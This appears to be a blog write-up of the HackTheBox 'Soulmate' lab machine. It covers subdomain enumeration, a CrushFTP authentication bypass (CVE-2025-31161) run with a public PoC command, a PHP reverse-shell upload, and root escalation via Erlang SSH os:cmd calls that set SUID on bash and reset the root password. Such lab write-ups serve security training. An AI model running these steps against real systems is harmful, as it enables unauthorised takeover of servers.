---
title: "Soulmate"
date: 2025-08-16
draft: false

tags:
- CVE
- HackTheBox
- Easy


categories:
- Writeups

showAuthor: true
showDate: true
showReadingTime: true
showWordCount: true
showTableOfContents: true
showTaxonomies: true
---

## Soulmate

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2F1IVDaEhYnm7udWPFo7zo%2Fimage.png?alt=media&#x26;token=7af9f730-f349-498d-809f-e08f8d2648a1" alt=""><figcaption></figcaption></figure>

## Machine Description

Soulmate is an easy-difficulty Linux machine that focuses on web enumeration and service discovery. The initial foothold comes from virtual host enumeration, which reveals a CrushFTP instance vulnerable to an authentication bypass (CVE-2025-31161). After gaining access, you can leverage file upload functionality to obtain remote code execution and land a shell. The box then transitions into local enumeration and privilege escalation, ultimately leading to root via a misconfigured/root-run command runner.

## Network Enumeration

```bash
# Nmap 7.98 scan initiated Fri Dec 12 09:31:14 2025 as: nmap -sCV -T4 -oN soulmate.nma 10.10.11.86
Nmap scan report for 10.10.11.86
Host is up (0.46s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open     http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
1081/tcp filtered pvuniwien
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec 12 09:32:22 2025 -- 1 IP address (1 host up) scanned in 67.47 seconds
```

The scan shows two open ports: `22` (SSH) and `80` (HTTP). Since a web server is running on port 80, I started with the web service.

> When working on an HTB box, map the IP to the domain in `/etc/hosts`.
>
> `echo '10.10.11.86 soulmate.htb' | sudo tee -a /etc/hosts`

## Web Enumeration

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2F0ymGtiF4CaTxGtZvBh7e%2Fimage.png?alt=media&#x26;token=1cfc2a91-1640-458e-b027-4a4af30a50cb" alt=""><figcaption></figcaption></figure>

After reviewing the application functionality, I didn’t find any direct vulnerabilities, so I proceeded with virtual host enumeration.

```bash
󰣇 ~/htb/soulmate ❯ ffuf -H 'HOST: FUZZ.soulmate.htb' -u http://soulmate.htb -w ~/Bitter/Discovery/DNS/bitquark-subdomains-top100000.txt -fl 8 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb
 :: Wordlist         : FUZZ: /home/bitter/Bitter/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 414ms]
```

The application exposes a subdomain, <mark style="color:$success;">ftp.soulmate.htb</mark>, which is running the <mark style="color:$info;">CrushFTP</mark> service. This version is vulnerable to an authentication bypass tracked as <mark style="color:$info;">CVE-2025-31161</mark>.

[Huntress.com](https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation)

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2F1ixeIqkQHQb6GY4EHGr2%2Fimage.png?alt=media&#x26;token=2c52a2eb-3778-40f1-856c-9a8e9b0c9269" alt=""><figcaption><p>Version Detection</p></figcaption></figure>

### Auth Bypass

[CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

This GitHub repo provides a complete PoC for the CVE, so I used it to create an admin user.

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user bitter --password bitter 
```

After creating the admin user, you can log in with the new credentials. During further enumeration, I found a user named <mark style="color:$primary;">ben</mark> associated with the <mark style="color:$info;">webProd</mark> directory. From the admin panel, it’s also possible to generate (reset) a password for <mark style="color:$primary;">ben</mark> and log in to that account.

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FWTZv56KPBJJOFtbEGoxX%2Fimage.png?alt=media&#x26;token=372920a3-67e2-4abc-aeaf-1746ef703c6d" alt=""><figcaption></figcaption></figure>

After logging in as <mark style="color:$primary;">ben</mark>, you can upload a PHP file that will be served on the `soulmate.htb` domain.

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FKCLeeSFDTUoP8vDq0FxD%2Fimage.png?alt=media&#x26;token=9bf4e4e4-9167-45c2-bf84-d38d8c773df4" alt=""><figcaption></figcaption></figure>

I uploaded `rev.php`, which contained a reverse-shell payload. After visiting `/rev.php`, I received a shell as `www-data`.

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FpoDH1KwU3OoLxcwzw1qu%2Fimage.png?alt=media&#x26;token=af08739f-8f12-4e04-9e6b-09c994d39acd" alt=""><figcaption></figcaption></figure>

## Post Exploitation

After getting a shell as `www-data`, I performed further enumeration to escalate privileges to user `ben` (using `ps aux` and a tool like `linpeas`).

### User

I noticed a binary running as `root`. Reviewing the script revealed credentials for user `ben`.

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FI9LBEwvMFnBgRGJEyxRn%2Fimage.png?alt=media&#x26;token=b3d8e81d-6459-4b06-a7ec-122df01d3307" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FknHJH6jWyK5440wTeXVv%2Fimage.png?alt=media&#x26;token=a3c5a7de-cde7-4db3-988b-a1efcdfeb324" alt=""><figcaption></figcaption></figure>

After finding `ben`’s password, I switched to the `ben` user and continued local enumeration. I found a service listening on port `2222/tcp`; banner grabbing identified it as `SSH-2.0-Erlang/5.2.9`.

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FNPT83IEbq85K9O5MPJLv%2Fimage.png?alt=media&#x26;token=68dcf724-12cc-437e-947e-c4ed98be1784" alt=""><figcaption></figcaption></figure>

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FF1jHrRcWznOY7wkyaE8v%2Fimage.png?alt=media&#x26;token=218baf45-1090-4567-becc-c0da0e9a2781" alt=""><figcaption></figcaption></figure>

### Root

Further research helped me confirm that I could run commands through it. Since `ssh_runner` runs as `root`, I used it to set the <mark style="color:$info;">SUID</mark> bit on `bash` and reset the <mark style="color:$info;">root</mark> password.

```bash
(ssh_runner@soulmate)2> os:cmd('id').

"uid=0(root) gid=0(root) groups=0(root)\n"
(ssh_runner@soulmate)9> os:cmd('chmod u+s /bin/bash && echo "root:root" | chpasswd').
[]
(ssh_runner@soulmate)10> os:cmd('ls -l /bin/bash').
"-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash\n"
```

<figure><img src="https://3488839997-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fiu5VPR3BNQ2pXa8kgTek%2Fuploads%2FDR2bpnqsYS2WLdwyT8v1%2Fimage.png?alt=media&#x26;token=c8bc48f6-0df6-405e-96e4-d3c3cbd933ea" alt=""><figcaption></figcaption></figure>

This allowed me to escalate to root and fully compromise the machine.

## Conclusion

This box focused on virtual host discovery, exploiting a real-world CVE, and chaining multiple privilege escalations. It’s a good example of how weak service isolation can lead to full system compromise.
